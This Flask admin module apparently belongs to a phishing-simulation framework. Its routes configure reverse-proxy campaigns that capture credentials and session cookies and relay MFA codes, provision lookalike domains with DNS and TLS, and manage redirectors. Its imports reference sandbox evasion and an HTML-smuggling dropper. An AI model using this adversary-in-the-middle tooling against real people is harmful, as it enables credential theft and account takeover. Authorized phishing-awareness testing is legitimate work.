import json
import logging
import base64
import csv
import io
import secrets
import hashlib
from io import BytesIO
from datetime import datetime, timedelta
from urllib.parse import urlparse

from flask import (
    Blueprint, request, redirect, url_for, render_template, session,
    send_file, jsonify, abort, flash, g, make_response, current_app
)
from dropoutjeep_lib import db
from dropoutjeep_lib.models import (
    Subsidiary, SendingProfile, Campaign, Recipient, Event, Target,
    CampaignJob, RateProfile, AutoReplyRule, PendingReply, User, AuditLog,
    TrainingCompletion, ApiToken, EmailTemplate, CampaignVersion, CanaryToken,
    Webhook, ProxyDomain, DomainReputation, SenderRotationPool,
    SenderRotationEntry, RecipientFingerprint, Redirector,
    CapturedCredential, CapturedCookie, RedirectorHealthLog
)
from dropoutjeep_lib.utils.auth import (
    login_required, admin_required, operator_required, viewer_required,
    log_audit, get_current_user
)
from dropoutjeep_lib.utils.analytics import get_heatmap_data, get_recipient_timeline, export_campaign_csv, export_campaign_pdf
from dropoutjeep_lib.utils.canary import (
    get_canary_embeds, record_canary_trigger, build_canary_url
)
from dropoutjeep_lib.utils.dkim_utils import (
    generate_dkim_keypair, format_dkim_dns_record, dkim_spf_check, check_dmarc
)
from dropoutjeep_lib.utils.validator import (
    validate_campaign_before_launch, validate_smtp_relay, verify_token_sig,
    check_spf, check_dkim_selector, check_spoof_alignment
)
from dropoutjeep_lib.utils.sandbox_evasion import should_serve_real_page, is_sandbox_ua
from dropoutjeep_lib.utils.html_smuggler import build_html_dropper, encode_payload
from dropoutjeep_lib.utils.domain_reputation import get_or_refresh_domain_reputation
from dropoutjeep_lib.utils.risk import recipient_risk_score, campaign_risk_summary
from dropoutjeep_lib.utils.funnel import compute_funnel
from dropoutjeep_lib.utils.scheduler import sync_campaign_schedules
from dropoutjeep_lib.utils.dialer import Dialer
from dropoutjeep_lib.utils.live import push_event
from dropoutjeep_lib.utils.tls_provisioner import is_domain_authorized

proxy_admin_bp = Blueprint('proxy_admin', __name__)

@proxy_admin_bp.route('/admin/campaign/<int:cid>/proxy', methods=['GET'])
@admin_required
def admin_campaign_proxy_config(cid):
    """Proxy configuration page for a campaign."""
    from dropoutjeep_lib.proxy.plugin_loader import list_plugins
    campaign = Campaign.query.get_or_404(cid)
    config = campaign.get_flow_config()
    rules_json = json.dumps(config.get("rules", []), indent=2)
    selected_plugins = config.get("plugins", [])
    from dropoutjeep_lib.utils.settings import get_base_url
    return render_template(
        "proxy_campaign.html",
        campaign=campaign,
        config=config,
        rules_json=rules_json,
        plugins=list_plugins(),
        selected_plugins=selected_plugins,
        base_url=get_base_url(),
    )


@proxy_admin_bp.route('/admin/campaign/<int:cid>/proxy-config', methods=['POST'])
@admin_required
def admin_campaign_proxy_config_save(cid):
    """Save proxy configuration."""
    campaign = Campaign.query.get_or_404(cid)
    config = campaign.get_flow_config() or {}

    target_url = request.form.get("target_url", "").strip()
    if target_url and not target_url.startswith(("http://", "https://")):
        flash("Target URL must start with http:// or https://", "error")
        return redirect(url_for("admin_campaign_proxy_config", cid=cid))

    upstream_proxy = request.form.get("upstream_proxy", "").strip()
    if upstream_proxy:
        parsed = urlparse(upstream_proxy)
        if parsed.scheme not in ("http", "https", "socks5", "socks5h"):
            flash("Upstream proxy must use http://, https://, socks5:// or socks5h://", "error")
            return redirect(url_for("admin_campaign_proxy_config", cid=cid))

    # Parse rules JSON
    rules_raw = request.form.get("rules_json", "[]").strip()
    try:
        rules = json.loads(rules_raw)
        if not isinstance(rules, list):
            raise ValueError("Rules must be a JSON array")
    except (json.JSONDecodeError, ValueError) as e:
        flash(f"Invalid rules JSON: {e}", "error")
        return redirect(url_for("admin_campaign_proxy_config", cid=cid))

    # Gather selected plugins and validate each one exists.
    from dropoutjeep_lib.proxy.plugin_loader import load_plugin, list_plugins
    available_plugin_names = {p["name"] for p in list_plugins()}
    selected_plugins = request.form.getlist("plugins")
    invalid_plugins = [p for p in selected_plugins if p not in available_plugin_names]
    if invalid_plugins:
        flash(f"Unknown plugins selected: {', '.join(invalid_plugins)}", "error")
        return redirect(url_for("admin_campaign_proxy_config", cid=cid))
    # Load each plugin once to catch parse errors before persisting.
    for plugin_name in selected_plugins:
        load_plugin(plugin_name)

    config["target_url"] = target_url
    config["upstream_proxy"] = upstream_proxy
    config["tls_fingerprint"] = request.form.get("tls_fingerprint", "").strip() or None
    config["renderer"] = request.form.get("renderer", "").strip() or None
    config["plugins"] = selected_plugins
    config["rules"] = rules
    config["static_prefix"] = request.form.get("static_prefix", "x9ut17jbqa").strip()
    config["capture_credentials"] = request.form.get("capture_credentials") == "on"
    config["capture_cookies"] = request.form.get("capture_cookies") == "on"
    config["mfa_relay_enabled"] = request.form.get("mfa_relay_enabled") == "on"
    config["username_field_names"] = [
        s.strip() for s in (request.form.get("username_field_names") or "").split(",")
        if s.strip()
    ] or None
    config["password_field_names"] = [
        s.strip() for s in (request.form.get("password_field_names") or "").split(",")
        if s.strip()
    ] or None
    config["mfa_field_names"] = [
        s.strip() for s in (request.form.get("mfa_field_names") or "").split(",")
        if s.strip()
    ] or None
    campaign.set_flow_config(config)

    # Set flow_type to reverse_proxy
    campaign.flow_type = "reverse_proxy"

    db.session.commit()
    flash("Proxy configuration saved. Campaign type set to reverse_proxy.", "success")
    return redirect(url_for("admin_campaign_proxy_config", cid=cid))


@proxy_admin_bp.route('/admin/campaign/<int:cid>/cookies')
@operator_required
def admin_campaign_cookies(cid):
    """Dashboard view for cookies captured by a proxy campaign."""
    campaign = Campaign.query.get_or_404(cid)
    cookies = CapturedCookie.query.filter_by(campaign_id=cid) \
        .order_by(CapturedCookie.captured_at.desc()).all()
    return render_template('campaign_cookies.html', campaign=campaign, cookies=cookies)


@proxy_admin_bp.route('/admin/campaign/<int:cid>/credentials')
@operator_required
def admin_campaign_credentials(cid):
    """Dashboard view for credentials captured by a proxy campaign."""
    campaign = Campaign.query.get_or_404(cid)
    credentials = CapturedCredential.query.filter_by(campaign_id=cid) \
        .order_by(CapturedCredential.captured_at.desc()).all()
    return render_template('campaign_credentials.html', campaign=campaign, credentials=credentials)


@proxy_admin_bp.route('/admin/proxy-domains')
@admin_required
def admin_proxy_domains():
    domains = ProxyDomain.query.order_by(ProxyDomain.domain).all()
    campaigns = Campaign.query.filter_by(flow_type='reverse_proxy').order_by(Campaign.name).all()
    return render_template('proxy_domains.html', domains=domains, campaigns=campaigns)


@proxy_admin_bp.route('/admin/proxy-domains/new', methods=['POST'])
@admin_required
def admin_proxy_domain_new():
    domain = request.form.get('domain', '').strip().lower()
    campaign_id = request.form.get('campaign_id', '')

    if not domain or not campaign_id:
        flash('Domain and campaign are required', 'danger')
        return redirect(url_for('admin_proxy_domains'))

    campaign = Campaign.query.get_or_404(int(campaign_id))
    if campaign.flow_type != 'reverse_proxy':
        flash('Selected campaign is not a reverse proxy campaign', 'danger')
        return redirect(url_for('admin_proxy_domains'))

    if ProxyDomain.query.filter_by(domain=domain).first():
        flash(f'Domain "{domain}" is already mapped', 'danger')
        return redirect(url_for('admin_proxy_domains'))

    is_wildcard = domain.startswith('*.')
    base_domain = domain[2:] if is_wildcard else domain

    pd = ProxyDomain(
        domain=domain,
        campaign_id=campaign.id,
        is_wildcard=is_wildcard,
        base_domain=base_domain,
        server_ip=request.form.get('server_ip', '').strip() or None,
        dns_provider=request.form.get('dns_provider', 'none').strip() or 'none',
        auto_tls_enabled=request.form.get('auto_tls_enabled') == 'on',
        acme_email=request.form.get('acme_email', '').strip() or None,
        tls_provider=request.form.get('tls_provider', 'none').strip() or 'none',
    )

    dns_credentials_raw = request.form.get('dns_credentials', '').strip()
    if dns_credentials_raw:
        import json
        try:
            pd.set_dns_credentials(json.loads(dns_credentials_raw))
        except json.JSONDecodeError as exc:
            flash(f'Invalid DNS credentials JSON: {exc}', 'danger')
            return redirect(url_for('admin_proxy_domains'))

    db.session.add(pd)
    db.session.commit()
    flash(f'Proxy domain "{domain}" created', 'success')
    return redirect(url_for('admin_proxy_domains'))


@proxy_admin_bp.route('/admin/proxy-domains/<int:domain_id>/toggle', methods=['POST'])
@admin_required
def admin_proxy_domain_toggle(domain_id):
    pd = ProxyDomain.query.get_or_404(domain_id)
    pd.is_active = not pd.is_active
    db.session.commit()
    flash(f'Proxy domain "{pd.domain}" {"enabled" if pd.is_active else "disabled"}', 'success')
    return redirect(url_for('admin_proxy_domains'))


@proxy_admin_bp.route('/admin/proxy-domains/<int:domain_id>/provision', methods=['POST'])
@admin_required
def admin_proxy_domain_provision(domain_id):
    from dropoutjeep_lib.dns import DNSManager
    from dropoutjeep_lib.utils.tls_provisioner import provision_tls
    pd = ProxyDomain.query.get_or_404(domain_id)

    dns_ok = DNSManager(pd).provision()
    if not dns_ok:
        flash(f'DNS provisioning failed for {pd.domain}', 'danger')
        return redirect(url_for('admin_proxy_domains'))

    if pd.auto_tls_enabled:
        tls_ok = provision_tls(pd)
        if not tls_ok:
            flash(f'TLS provisioning failed for {pd.domain}: {pd.provision_error}', 'danger')
            return redirect(url_for('admin_proxy_domains'))

    flash(f'Proxy domain "{pd.domain}" provisioned (DNS={dns_ok}, TLS={pd.tls_ready})', 'success')
    return redirect(url_for('admin_proxy_domains'))


@proxy_admin_bp.route('/admin/proxy-domains/<int:domain_id>/delete', methods=['POST'])
@admin_required
def admin_proxy_domain_delete(domain_id):
    pd = ProxyDomain.query.get_or_404(domain_id)
    db.session.delete(pd)
    db.session.commit()
    flash(f'Proxy domain "{pd.domain}" deleted', 'success')
    return redirect(url_for('admin_proxy_domains'))


@proxy_admin_bp.route('/internal/caddy-ask')
def caddy_ask():
    """Caddy on-demand TLS authorization endpoint."""
    domain = request.args.get('domain', '').strip().lower()
    if not domain:
        return 'missing domain', 400
    if is_domain_authorized(domain):
        return 'authorized', 200
    return 'unauthorized', 403


@proxy_admin_bp.route('/admin/redirectors')
@admin_required
def admin_redirectors():
    redirectors = Redirector.query.order_by(Redirector.created_at.desc()).all()
    return render_template('redirectors.html', redirectors=redirectors)


@proxy_admin_bp.route('/admin/redirectors/new', methods=['POST'])
@admin_required
def admin_redirector_new():
    name = request.form.get('name', '').strip()
    url_template = request.form.get('url_template', '').strip()

    if not name or not url_template:
        flash('Name and redirector URL template are required', 'danger')
        return redirect(url_for('admin_redirectors'))

    if Redirector.query.filter_by(url_template=url_template).first():
        flash('That redirector template already exists', 'danger')
        return redirect(url_for('admin_redirectors'))

    r = Redirector(name=name, url_template=url_template)
    db.session.add(r)
    db.session.commit()
    flash(f'Redirector "{name}" created', 'success')
    return redirect(url_for('admin_redirectors'))


@proxy_admin_bp.route('/admin/redirectors/<int:redirector_id>/toggle', methods=['POST'])
@admin_required
def admin_redirector_toggle(redirector_id):
    r = Redirector.query.get_or_404(redirector_id)
    r.is_active = not r.is_active
    db.session.commit()
    flash(f'Redirector "{r.name}" {"enabled" if r.is_active else "disabled"}', 'success')
    return redirect(url_for('admin_redirectors'))


@proxy_admin_bp.route('/admin/redirectors/<int:redirector_id>/check', methods=['POST'])
@admin_required
def admin_redirector_check(redirector_id):
    from dropoutjeep_lib.utils.redirectors import refresh_redirector_health
    r = Redirector.query.get_or_404(redirector_id)
    healthy = refresh_redirector_health(r)
    flash(
        f'Redirector "{r.name}" is {r.health_status}'
        + (f' ({r.last_error})' if not healthy and r.last_error else ''),
        'success' if healthy else 'warning'
    )
    return redirect(url_for('admin_redirectors'))


@proxy_admin_bp.route('/admin/redirectors/<int:redirector_id>/delete', methods=['POST'])
@admin_required
def admin_redirector_delete(redirector_id):
    r = Redirector.query.get_or_404(redirector_id)
    db.session.delete(r)
    db.session.commit()
    flash(f'Redirector "{r.name}" deleted', 'success')
    return redirect(url_for('admin_redirectors'))


# ---------------------------------------------------------------------------
# DNS dashboard
# ---------------------------------------------------------------------------
@proxy_admin_bp.route('/admin/dns-dashboard')
@admin_required
def admin_dns_dashboard():
    """Overview of DNS provisioning status for all proxy domains."""
    domains = ProxyDomain.query.order_by(ProxyDomain.domain).all()
    return render_template('dns_dashboard.html', domains=domains)


# ---------------------------------------------------------------------------
# TLS certificate status dashboard
# ---------------------------------------------------------------------------
@proxy_admin_bp.route('/admin/tls-status')
@admin_required
def admin_tls_status():
    """Overview of TLS certificate status for all proxy domains."""
    domains = ProxyDomain.query.order_by(ProxyDomain.domain).all()
    return render_template('tls_status.html', domains=domains)


# ---------------------------------------------------------------------------
# Redirector health check all
# ---------------------------------------------------------------------------
@proxy_admin_bp.route('/admin/redirectors/check-all', methods=['POST'])
@admin_required
def admin_redirector_check_all():
    """Run health checks on all redirectors at once."""
    from dropoutjeep_lib.utils.redirectors import check_all_redirectors
    results = check_all_redirectors()
    healthy = sum(1 for r in results if r['healthy'])
    unhealthy = len(results) - healthy
    log_audit('redirector_check_all', details={
        'total': len(results), 'healthy': healthy, 'unhealthy': unhealthy
    })
    if unhealthy:
        flash(f'Checked {len(results)} redirectors: {healthy} healthy, {unhealthy} unhealthy.', 'warning')
    else:
        flash(f'All {len(results)} redirectors are healthy.', 'success')
    return redirect(url_for('admin_redirectors'))


# ---------------------------------------------------------------------------
# Redirector health dashboard
# ---------------------------------------------------------------------------
@proxy_admin_bp.route('/admin/redirectors/health')
@viewer_required
def admin_redirector_health():
    """Health monitoring dashboard for all redirectors."""
    from dropoutjeep_lib.utils.redirectors import get_redirector_health_history

    redirectors = Redirector.query.order_by(Redirector.created_at.desc()).all()
    total = len(redirectors)
    healthy_count = sum(1 for r in redirectors if r.health_status == 'healthy')
    unhealthy_count = sum(1 for r in redirectors if r.health_status == 'unhealthy')
    unknown_count = total - healthy_count - unhealthy_count

    # Get recent health history for each redirector
    health_data = []
    for r in redirectors:
        history = get_redirector_health_history(r.id, limit=30)
        health_data.append({
            'redirector': r,
            'history': history,
        })

    # Aggregate stats for uptime chart
    all_logs = RedirectorHealthLog.query \
        .order_by(RedirectorHealthLog.checked_at.desc()) \
        .limit(200).all()

    return render_template(
        'redirector_health.html',
        redirectors=redirectors,
        health_data=health_data,
        total=total,
        healthy_count=healthy_count,
        unhealthy_count=unhealthy_count,
        unknown_count=unknown_count,
        all_logs=all_logs,
    )


@proxy_admin_bp.route('/admin/redirectors/<int:redirector_id>/history')
@viewer_required
def admin_redirector_history(redirector_id):
    """Return health history for a redirector as JSON (for charts)."""
    from dropoutjeep_lib.utils.redirectors import get_redirector_health_history
    r = Redirector.query.get_or_404(redirector_id)
    history = get_redirector_health_history(redirector_id, limit=100)
    return jsonify({
        'redirector_id': r.id,
        'name': r.name,
        'history': history,
    })
